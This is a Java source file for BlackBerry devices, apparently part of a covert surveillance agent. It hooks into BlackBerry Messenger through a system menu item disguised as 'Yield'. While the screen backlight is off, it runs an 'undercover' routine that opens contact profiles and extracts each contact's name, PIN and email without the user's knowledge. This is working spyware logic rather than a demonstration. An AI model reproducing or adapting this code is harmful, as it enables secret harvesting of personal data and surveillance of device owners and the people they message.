package com.rim.samples.device.bbminjectdemo;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.lbs.MapField;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.system.EventLogger;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.accessibility.AccessibleContext;
import net.rim.device.api.ui.component.BitmapField;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.ChoiceField;
import net.rim.device.api.ui.component.DateField;
import net.rim.device.api.ui.component.GaugeField;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.NullField;
import net.rim.device.api.ui.component.ObjectListField;
import net.rim.device.api.ui.component.RadioButtonField;
import net.rim.device.api.ui.component.SeparatorField;
import net.rim.device.api.ui.component.SpinBoxField;
import net.rim.device.api.ui.component.TextField;
import net.rim.device.api.ui.component.TreeField;
import net.rim.device.api.util.Arrays;

public class BBMMenuItem extends ApplicationMenuItem {
	private static final String BBM_MENU = "Yield";
	//#ifdef DEBUG
	private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
	// #endif
	private static BBMMenuItem instance;

	UiApplication bbmApplication;
	Screen contactsScreen;
	// Vector conversationScreens = new Vector();

	Hashtable users = new Hashtable();
	Hashtable userConversations = new Hashtable();

	boolean bbmInjected = false;

	// int numContacts;
	// int numEmails;

	static BBMMenuItem getInstance() {
		if (instance == null)
			instance = new BBMMenuItem(20);

		return instance;
	}

	public BBMMenuItem(int arg0) {
		super(arg0);

		undercover = !Backlight.isEnabled();
		lookForConversationsThread();

	}

	Vector contacts = new Vector();
	Thread t = null;
	boolean undercover = false;
	ConversationScreen conversationScreen;

	public void lookForConversationsThread() {

		if (t != null) {
			return;
		}
		conversationScreen = new ConversationScreen();
		t = new Thread(conversationScreen);

		t.start();

	}

	public Object run(Object context) {
		try {
			debug.info("BBMMenuItem context: " + context);
			UiApplication app = UiApplication.getUiApplication();
			Class cl = app.getClass();

			debug.trace("class: " + cl);

			Screen screen = UiApplication.getUiApplication().getActiveScreen();

			debug.trace("screen: " + screen + " count: "
					+ screen.getUiEngine().getScreenCount());

			debug.startBuffering(EventLogger.INFORMATION);
			if (screen.getClass().getName().indexOf("BBMContactsScreen") > 0) {
				contacts.removeAllElements();

				contactsScreen = screen;
				bbmApplication = UiApplication.getUiApplication();

				FieldExplorer explorer = new FieldExplorer();
				contacts = explorer.explore(screen);

				screen.close();
				bbmInjected = true;

				// lookForConversationsThread();
				conversationScreen.setBBM(bbmApplication);

				debug.info("BBM INJECTED!");
				debug.ledStart(Debug.COLOR_GREEN);

			} else {
				debug.warn("BBM NOT INJECTED!");
				debug.ledStart(Debug.COLOR_RED);
			}

			debug.stopBuffering();

		} catch (Exception ex) {
			debug.warn("injectBBM:" + ex.toString());
			debug.ledStart(Debug.COLOR_RED);
		}
		return null;
	}

	private synchronized boolean extractProfile(Screen screen) {
		debug.trace("extractProfile");
		debug.trace("  local active screen: "
				+ UiApplication.getUiApplication().getActiveScreen());

		try {
			if (MenuWalker.walk("View Contact Profile", screen, true)
					|| MenuWalker.walk("Contact Profile", screen, true)) {
				Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);

				debug.info("wolked in Contact Profile");
				Utils.sleep(100);
				Screen newScreen = UiApplication.getUiApplication()
						.getActiveScreen();

				if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
					debug.trace("no Contact Profile: " + newScreen);
					return false;
				}
				// Ocio che gli schermi aperti vengono agganciati a
				// UiApplication!
				// debug.trace("  active screen: " + newScreen);
				// debug.trace("  local active screen: "
				// + UiApplication.getUiApplication().getActiveScreen());

				debug.trace("exploring Contact Profile: " + newScreen);

				FieldExplorer explorer = new FieldExplorer();
				Vector textfields = explorer.explore(newScreen);

				if (textfields.size() == 2 || textfields.size() == 3) {
					String user = (String) textfields.elementAt(0);
					String pin = (String) textfields.elementAt(1);
					String email = "";
					
					debug.info("User: " + user);
					debug.info("PIN: " + pin);
					
					if(textfields.size() == 3){
						email = (String) textfields.elementAt(2);
						debug.info("Email: " + email);
					}
					
					users.put(user.toLowerCase(), new User(user,pin,email));

					debug.ledStart(Debug.COLOR_ORANGE);
				}

				debug.trace("closing Contact Profile");
				newScreen.close();
			} else {
				debug.info("");
			}

		} catch (Exception ex) {
			debug.stopBuffering();
			debug.error(ex.toString());
			return false;
		}
		return true;
	}

	public String toString() {
		return BBM_MENU;
	}

	Thread ucThread;

	public void underCoverJobs() {

		debug.info("Under cover");
		undercover = true;

		if (ucThread != null) {
			return;
		}

		if (!bbmInjected) {
			return;
		}

		ucThread = new Thread(new Runnable() {

			public void run() {

				for (int i = 0; i < conversationScreen.size(); i++) {
					final Screen screen = conversationScreen.elementAt(i);

					bbmApplication.invokeLater(new Runnable() {

						public void run() {
							debug.trace("run, extracting profile from: "
									+ screen);
							extractProfile(screen);
						}

					});
					
					Utils.sleep(500);

				}
			}

		});

		ucThread.start();

	}

	public void stopUnderCoverJobs() {
		debug.info("Stop Under cover");
		undercover = false;

		// if (ucThread != null) {
		// ucThread.interrupt();
		// }

		ucThread = null;

	}

	public void addMenuBBM() {
		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
		// long bbmid = 4470559380030396000L; Non funziona
		// long bbmid = 5028374280894129973L; Non funziona
		// long bbmid = 7084794250801777300L;
		ApplicationMenuItemRepository.getInstance().addMenuItem(bbmid, this);
	}

	public void removeMenuBBM() {
		long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
		ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid, this);
	}

}
